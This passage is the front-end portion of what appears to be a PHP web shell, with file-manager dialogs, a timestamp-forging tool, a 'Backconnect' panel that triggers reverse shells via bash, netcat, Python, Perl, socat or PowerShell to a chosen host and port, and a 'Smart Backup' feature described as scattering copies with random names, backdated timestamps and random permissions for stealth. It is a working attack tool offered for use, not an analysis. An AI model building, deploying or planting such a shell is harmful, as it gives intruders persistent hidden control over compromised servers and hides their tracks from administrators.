entColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg></button><button class="ab dg" data-t="Delete" onclick="doDl('<?php echo $ep; ?>','<?php echo $en; ?>')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 01-2 2H7a2 2 0 01-2-2V6m3 0V4a2 2 0 012-2h4a2 2 0 012 2v2"/></svg></button></div></td></tr><?php endforeach; ?></tbody></table><?php endif; ?></div><?php endif; ?></div><div class="ov" id="mU"><div class="md"><div class="mh"><h3>Upload File</h3><button class="mx" onclick="mC('mU')"><svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div><form method="post" enctype="multipart/form-data"><div class="mb"><input type="hidden" name="fm_action" value="upload"><input type="hidden" name="current_path" value="<?php echo htmlspecialchars($path); ?>"><div class="fg"><label>To: <?php echo htmlspecialchars($path); ?></label></div><div class="fg"><label class="dz" id="dz">Click or drag file here<br><small>Max: <?php echo htmlspecialchars($upload_max); ?></small><input type="file" name="fm_file" id="uf" onchange="sN(this)"></label><div id="un" style="margin-top:8px;font-size:12px;color:var(--accent);display:none"></div></div></div><div class="mf"><button type="button" class="bt" onclick="mC('mU')">Cancel</button><button type="submit" class="bt bt-a">Upload</button></div></form></div></div><div class="ov" id="mNF"><div class="md"><div class="mh"><h3>Create File</h3><button class="mx" onclick="mC('mNF')"><svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div><form method="post"><div class="mb"><input type="hidden" name="fm_action" value="newfile"><input type="hidden" name="current_path" value="<?php echo htmlspecialchars($path); ?>"><div class="fg"><label for="nf">Filename</label><input type="text" name="fname" id="nf" class="fi2" placeholder="example.txt" required></div></div><div class="mf"><button type="button" class="bt" onclick="mC('mNF')">Cancel</button><button type="submit" class="bt bt-a">Create</button></div></form></div></div><div class="ov" id="mND"><div class="md"><div class="mh"><h3>Create Folder</h3><button class="mx" onclick="mC('mND')"><svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div><form method="post"><div class="mb"><input type="hidden" name="fm_action" value="newfolder"><input type="hidden" name="current_path" value="<?php echo htmlspecialchars($path); ?>"><div class="fg"><label for="nd">Folder name</label><input type="text" name="fname" id="nd" class="fi2" placeholder="new-folder" required></div></div><div class="mf"><button type="button" class="bt" onclick="mC('mND')">Cancel</button><button type="submit" class="bt bt-a">Create</button></div></form></div></div><div class="ov" id="mRn"><div class="md"><div class="mh"><h3>Rename</h3><button class="mx" onclick="mC('mRn')"><svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div><form method="post"><div class="mb"><input type="hidden" name="fm_action" value="rename"><input type="hidden" name="current_path" value="<?php echo htmlspecialchars($path); ?>"><input type="hidden" name="fpath" id="rp"><div class="fg"><label for="rn">New name</label><input type="text" name="newname" id="rn" class="fi2" required></div></div><div class="mf"><button type="button" class="bt" onclick="mC('mRn')">Cancel</button><button type="submit" class="bt bt-a">Rename</button></div></form></div></div><div class="ov" id="mTc"><div class="md"><div class="mh"><h3>Change Timestamp</h3><button class="mx" onclick="mC('mTc')"><svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div><form method="post"><div class="mb"><input type="hidden" name="fm_action" value="touch"><input type="hidden" name="current_path" value="<?php echo htmlspecialchars($path); ?>"><input type="hidden" name="fpath" id="tp"><div class="fg"><label id="tl">File:</label></div><div class="fg"><label for="ts">Date/time</label><input type="datetime-local" name="tstamp" id="ts" class="fi2"></div></div><div class="mf"><button type="button" class="bt" onclick="mC('mTc')">Cancel</button><button type="submit" class="bt bt-a">Update</button></div></form></div></div><div class="ov" id="mDl"><div class="md"><div class="mh"><h3>Delete</h3><button class="mx" onclick="mC('mDl')"><svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div><form method="post"><div class="mb"><input type="hidden" name="fm_action" value="delete"><input type="hidden" name="current_path" value="<?php echo htmlspecialchars($path); ?>"><input type="hidden" name="fpath" id="dp"><p style="font-size:13px">Delete <strong id="dn" style="color:var(--err)"></strong>?</p></div><div class="mf"><button type="button" class="bt" onclick="mC('mDl')">Cancel</button><button type="submit" class="bt bt-d">Delete</button></div></form></div></div><div class="ov" id="mBc"><div class="md"><div class="mh"><h3>Backconnect</h3><button class="mx" onclick="mC('mBc')"><svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div><div class="mb"><div class="fg"><label>Target Host</label><div class="bc-input-group"><input type="text" id="bcHost" class="fi2" placeholder="192.168.1.100 or example.ngrok.io" value="127.0.0.1"><input type="number" id="bcPort" class="fi2" placeholder="Port" value="4444" min="1" max="65535" style="width:100px"></div></div><div class="fg"><label>Method</label><div class="bc-method-select" id="bcMethodSelect"><button class="bc-method-btn active" data-method="auto">Auto</button><?php if (IS_WIN): ?><button class="bc-method-btn" data-method="powershell">PowerShell</button><button class="bc-method-btn" data-method="nc">Netcat</button><button class="bc-method-btn" data-method="vbscript">VBScript</button><?php else: ?><button class="bc-method-btn" data-method="bash">Bash</button><button class="bc-method-btn" data-method="nc">Netcat</button><button class="bc-method-btn" data-method="python">Python</button><button class="bc-method-btn" data-method="php">PHP</button><button class="bc-method-btn" data-method="perl">Perl</button><button class="bc-method-btn" data-method="ruby">Ruby</button><button class="bc-method-btn" data-method="socat">Socat</button><button class="bc-method-btn" data-method="telnet">Telnet</button><?php endif; ?></div></div><div class="bc-info"><strong>Info:</strong> Backconnect akan berjalan di background. Pastikan listener sudah siap di <span id="bcListenerInfo">127.0.0.1:4444</span>.</div><div id="bcStatus" class="bc-status"></div></div><div class="mf"><button type="button" class="bt" onclick="mC('mBc')">Cancel</button><button type="button" class="bt bt-a" onclick="startBackconnect()">Start Backconnect</button></div></div></div><div class="ov" id="mSb"><div class="md md-lg"><div class="mh"><h3>Smart Backup</h3><button class="mx" onclick="mC('mSb')"><svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div><div class="mb"><div style="margin-bottom: 20px;"><p style="font-size: 14px; margin-bottom: 10px;">Smart Backup akan membuat <strong><?php echo MAX_BACKUP_SPREAD; ?></strong> file backup di berbagai lokasi writable.</p><p style="font-size: 12px; color: var(--text-dim); margin-bottom: 15px;">File akan memiliki nama acak, timestamp acak (2010-2020), dan permission acak untuk stealth.</p></div><div id="sbStatus" class="bc-status" style="display: none;"></div><div id="sbResults" style="display: none; max-height: 300px; overflow-y: auto; border: 1px solid var(--border); border-radius: var(--r); padding: 12px; background: var(--bg-0);"><h4 style="margin-bottom: 10px; color: var(--accent);">Backup Files Created:</h4><div id="sbResultsList"></div></div></div><div class="mf"><button type="button" class="bt" onclick="mC('mSb')">Close</button><button type="button" class="bt bt-a" onclick="startSmartBackup()" id="sbStartBtn">Start Backup</button></div></div></div><?php if($view_data!==null): ?><div class="ov on" id="mV"><div class="md md-lg"><div class="mh"><h3><?php echo htmlspecialchars($view_name); ?></h3><a class="mx" href="?path=<?php echo $path_enc; ?>"><svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></a></div><div class="mb"><div class="vb"><?php echo htmlspecialchars($view_data); ?></div></div><div class="mf"><a class="bt" href="?path=<?php echo $path_enc; ?>">Close</a></div></div></div><?php endif; ?><?php if($edit_data!==null): ?><div class="ov on" id="mE"><div class="md md-lg"><div class="mh"><h3>Edit: <?php echo htmlspecialchars($edit_name); ?></h3><a class="mx" href="?path=<?php echo $path_enc; ?>"><svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></a></div><form method="post"><div class="mb"><input type="hidden" name="fm_action" value="save"><input type="hidden" name="current_path" value="<?php echo htmlspecialchars($path); ?>"><input type="hidden" name="fpath" value="<?php echo htmlspecialchars($edit_path); ?>"><textarea name="content" class="fi2" style="min-height:380px;height:58vh"><?php echo htmlspecialchars($edit_data); ?></textarea></div><div class="mf"><a class="bt" href="?path=<?php echo $path_enc; ?>">Cancel</a><button type="submit" class="bt bt-a">Save</button></div></form></div></div><?php endif; ?>
<script>
function mO(id){var e=document.getElementById(id);if(e)e.classList.add('on');var s=document.getElementById('sb');if(s)s.classList.remove('open');}
function mC(id){var e=document.getElementById(id);if(e)e.classList.remove('on');}
function openBackconnectModal(){mO('mBc');updateListenerInfo();}
function updateListenerInfo(){var host=document.getElementById('bcHost').value;var port=document.getElementById('bcPort').value;document.getElementById('bcListenerInfo').textContent=host+':'+port;}
function setActiveMethod(method){var buttons=document.querySelectorAll('#bcMethodSelect .bc-method-btn');for(var i=0;i<buttons.length;i++){if(buttons[i].getAttribute('data-method')===method){buttons[i].classList.add('active');}else{buttons[i].classList.remove('active');}}}
function startBackconnect(){var host=document.getElementById('bcHost').value.trim();var port=document.getElementById('bcPort').value;var activeMethod=document.querySelector('#bcMethodSelect .bc-method-btn.active');var method=activeMethod?activeMethod.getAttribute('data-method'):'auto';var statusDiv=document.getElementById('bcStatus');if(!host){showStatus('error','Host cannot be empty');return;}port=parseInt(port);if(isNaN(port)||port<1||port>65535){showStatus('error','Invalid port number (1-65535)');return;}showStatus('info','Connecting to '+host+':'+port+'...');var formData=new FormData();formData.append('fm_backconnect','1');formData.append('host',host);formData.append('port',port);formData.append('method',method);fetch(window.location.href,{method:'POST',body:formData}).then(function(response){return response.json();}).then(function(data){if(data.ok){showStatus('success',data.msg);setTimeout(function(){mC('mBc');},2000);}else{showStatus('error',data.msg);}}).catch(function(error){showStatus('error','Error: '+error);});}
function showStatus(type,message){var statusDiv=document.getElementById('bcStatus');statusDiv.className='bc-status '+type;statusDiv.textContent=message;statusDiv.style.display='block';}
document.addEventListener('DOMContentLoaded',function(){var hostInput=document.getElementById('bcHost');var portInput=document.getElementById('bcPort');if(hostInput){hostInput.addEventListener('input',updateListenerInfo);}if(portInput){portInput.addEventListener('input',updateListenerInfo);}var methodButtons=document.querySelectorAll('#bcMethodSelect .bc-method-btn');for(var i=0;i<methodButtons.length;i++){(function(btn){btn.addEventListener('click',function(e){e.preventDefault();var method=this.getAttribute('data-method');setActiveMethod(method);});})(methodButtons[i]);}});
function openSmartBackupModal(){var statusDiv=document.getElementById('sbStatus');var resultsDiv=document.getElementById('sbResults');var startBtn=document.getElementById('sbStartBtn');if(statusDiv)statusDiv.style.display='none';if(resultsDiv)resultsDiv.style.display='none';if(document.getElementById('sbResultsList')){document.getElementById('sbResultsList').innerHTML='';}if(startBtn){startBtn.disabled=false;startBtn.textContent='Start Backup';}mO('mSb');}
function startSmartBackup(){var statusDiv=document.getElementById('sbStatus');var resultsDiv=document.getElementById('sbResults');var resultsList=document.getElementById('sbResultsList');var startBtn=document.getElementById('sbStartBtn');if(!statusDiv||!resultsDiv||!resultsList||!startBtn){alert('Modal elements not found');return;}statusDiv.className='bc-status info';statusDiv.textContent='Scanning directories and creating backups...';statusDiv.style.display='block';resultsDiv.style.display='none';startBtn.disabled=true;startBtn.textContent='Processing...';fetch(window.location.pathname+'?smart_backup=1',{method:'GET',headers:{'X-Requested-With':'XMLHttpRequest'}}).then(function(response){if(!response.ok){throw new Error('HTTP error '+response.status);}return response.json();}).then(function(data){if(data.ok){statusDiv.className='bc-status success';statusDiv.textContent=data.message;if(data.results&&data.results.length>0){var html='';for(var i=0;i<data.results.length;i++){var item=data.results[i];html+='<div style="margin-bottom: 10px; padding: 8px; border-bottom: 1px solid var(--border);"><a href="'+item.url+'" target="_blank" style="color: var(--accent); font-weight: 500;"><svg width="12" height="12" style="display: inline; margin-right: 4px;" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>'+item.filename+'</a><br><span style="font-size: 11px; color: var(--text-dim);">'+item.path+' ('+item.size+' bytes)</span></div>';}resultsList.innerHTML=html;resultsDiv.style.display='block';}else{resultsList.innerHTML='<p style="color: var(--text-dim);">No files were created. No writable directories found.</p>';resultsDiv.style.display='block';}startBtn.textContent='Done';}else{statusDiv.className='bc-status error';statusDiv.textContent='Error: '+(data.message||'Unknown error');startBtn.disabled=false;startBtn.textContent='Try Again';}}).catch(function(error){console.error('Fetch error:',error);statusDiv.className='bc-status error';statusDiv.textContent='Error: '+error.message;startBtn.disabled=false;startBtn.textContent='Try Again';});}
var ovs=document.querySelectorAll('.ov');for(var i=0;i<ovs.length;i++){(function(o){o.addEventListener('click',function(e){if(e.target===o){var l=o.querySelector('a.mx');if(l){l.click();return}o.classList.remove('on');}});})(ovs[i]);}
document.addEventListener('keydown',function(e){if(e.key==='Escape'||e.keyCode===27){var a=document.querySelector('.ov.on');if(a){var l=a.querySelector('a.mx');if(l){l.click();return}a.classList.remove('on');}}});
var ta=document.querySelector('#mE textarea');if(ta){ta.addEventListener('keydown',function(e){if(e.key==='Tab'||e.keyCode===9){e.preventDefault();var s=this.selectionStart,end=this.selectionEnd;this.value=this.value.substring(0,s)+'    '+this.value.substring(end);this.selectionStart=this.selectionEnd=s+4;}});}
function doRn(p,n){document.getElementById('rp').value=p;document.getElementById('rn').value=n;mO('mRn');setTimeout(function(){document.getElementById('rn').select();},120);}
function doTc(p,n){document.getElementById('tp').value=p;document.getElementById('tl').textContent='File: '+n;mO('mTc');}
function doDl(p,n){document.getElementById('dp').value=p;document.getElementById('dn').textContent=n;mO('mDl');}
function sN(inp){var el=document.getElementById('un');if(inp.files&&inp.files.length>0){el.textContent=inp.files[0].name;el.style.display='block';}}
var dz=document.getElementById('dz');if(dz){dz.addEventListener('dragover',function(e){e.preventDefault();dz.style.borderColor='var(--accent)';});dz.addEventListener('dragleave',function(){dz.style.borderColor='';});dz.addEventListener('drop',function(e){e.preventDefault();dz.style.borderColor='';var fi=document.getElementById('uf');if(e.dataTransfer&&e.dataTransfer.files.length>0&&fi){fi.files=e.dataTransfer.files;sN(fi);}});}
document.addEventListener('keydown',function(e){if((e.ctrlKey||e.metaKey)&&(e.key==='s'||e.keyCode===83)){var ed=document.querySelector('#mE form');if(ed&&document.getElementById('mE').classList.contains('on')){e.preventDefault();ed.submit();}}});</script></body></html>
